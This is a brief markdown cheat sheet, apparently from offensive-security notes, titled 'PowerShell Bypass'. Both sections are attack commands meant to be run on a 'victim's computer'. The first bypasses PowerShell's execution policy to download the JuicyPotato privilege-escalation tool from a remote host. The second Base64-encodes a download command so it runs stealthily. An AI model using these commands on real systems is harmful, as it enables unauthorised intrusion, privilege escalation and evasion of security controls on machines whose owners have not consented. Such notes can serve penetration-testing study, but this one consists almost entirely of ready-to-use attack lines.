# PowerShell Bypass

```
Description: PowerShell Vulnerabilities

Open cmd.exe on victim's computer

# DL a file from a remote server victim's desktop, bypassing PowerShell's security restrictions
powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.1:80/winprivesc/JuicyPotato.exe','C:\Users\john\Desktop\juicy.exe')
```

# Another Vulnerability
```
Open cmd.exe on victim's computer

# encodes a PowerShell command in Base64, which can then be safely and stealthily executed
$Command = '(new-object System.Net.WebClient).DownloadFile("http://192.168.0.1:80/ftp.txt","C:\Windows\temp\ftp.txt")' 
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command)) 
powershell.exe -NoProfile -encoded $Encoded
```

## Back to README.md
[BACK](../README.md)